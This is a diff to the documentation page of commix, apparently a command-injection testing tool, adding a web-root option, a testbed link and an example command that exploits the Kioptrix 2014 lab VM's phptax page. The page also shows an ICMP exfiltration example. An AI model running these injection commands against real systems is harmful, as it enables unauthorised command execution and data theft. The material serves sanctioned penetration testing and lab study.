@@ -143,6 +143,8 @@ to provide custom injection payloads.
 --base64            Use Base64 (enc)/(de)code trick to prevent false-
                     positive results.
 --tmp-path=TMP_P..  Set remote absolute path of temporary files directory.
+--root-dir=SRV_R..  Set remote absolute path of web server's root
+                    directory (Default: /var/www/).
 --icmp-exfil=IP_..  Use the ICMP exfiltration technique (e.g.
                     'ip_src=192.168.178.1,ip_dst=192.168.178.3').
 --alter-shell       Use an alternative os-shell (Python). Available only
@@ -173,6 +175,11 @@ to provide custom injection payloads.
 <pre><code>su -c "python commix.py --url="http://192.168.178.8/debug.php" --data="addr=127.0.0.1" --icmp-exfil="ip_src=192.168.178.5,ip_dst=192.168.178.8""
 </code></pre>
 
+<p><strong>Exploiting <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/" target="_blank">Kioptrix: 2014 (#5)</a> using custom user-agent and specified injection technique:</strong></p>
+
+<pre><code>python commix.py --url="http://192.168.178.6:8080/phptax/drawimage.php?pfilez=INJECT_HERE&pdf=make" --user-agent="Mozilla/4.0 Mozilla4_browser" --technique="file-based" --root-dir="/"
+</code></pre>
+
 <h4>
 <a id="command-injection-testbeds" class="anchor" href="#command-injection-testbeds" aria-hidden="true"><span class="octicon octicon-link"></span></a>Command injection testbeds.</h4>
 
@@ -186,6 +193,7 @@ to provide custom injection payloads.
 <li><a href="https://www.vulnhub.com/entry/pentester-lab-web-for-pentester,71/" target="_blank">Pentester Lab: Web For Pentester</a></li>
 <li><a href="https://www.vulnhub.com/entry/command-injection-iso-1,81/" target="_blank">Pentester Academy: Command Injection ISO: 1</a></li>
 <li><a href="https://github.com/SpiderLabs/MCIR/tree/master/shellol" target="_blank">SpiderLabs: MCIR (ShelLOL)</a></li>
+<li><a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/" target="_blank">Kioptrix: 2014 (#5)</a></li>
 <li>[...]</li>
 </ul>
       </section>
@@ -195,7 +203,7 @@ to provide custom injection payloads.
     <!-- FOOTER  -->
     <div id="footer_wrap" class="outer">
       <footer class="inner">
-        <p class="copyright"><strong>Commix</strong> maintained by <strong><a href="https://github.com/stasinopoulos">Anastasios Stasinopoulos</a>(<a href="https://twitter.com/ancst">@ancst</a></strong>)</a></p>
+        <p class="copyright"><strong>Commix</strong> maintained by <strong><a href="https://github.com/stasinopoulos">Anastasios Stasinopoulos</a>(<a href="https://twitter.com/ancst">@ancst</a></strong>)</a></p><p></p>
       </footer>
     </div>
    
